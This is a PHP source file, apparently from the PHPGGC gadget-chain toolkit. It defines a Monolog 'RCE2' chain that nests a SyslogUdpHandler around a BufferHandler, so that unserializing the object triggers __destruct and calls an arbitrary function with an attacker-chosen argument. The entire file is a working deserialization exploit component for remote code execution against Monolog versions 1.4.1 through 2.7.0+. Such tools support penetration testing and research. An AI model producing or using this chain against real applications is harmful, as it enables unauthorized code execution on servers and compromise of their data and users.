<?php

namespace GadgetChain\Monolog;

class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.4.1 <= 2.7.0+';
    public static $vector = '__destruct';
    public static $author = 'cf';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Monolog\Handler\SyslogUdpHandler(
            new \Monolog\Handler\BufferHandler(
                ['current', $function],
                [$parameter, 'level' => null]
            )
        );
    }
}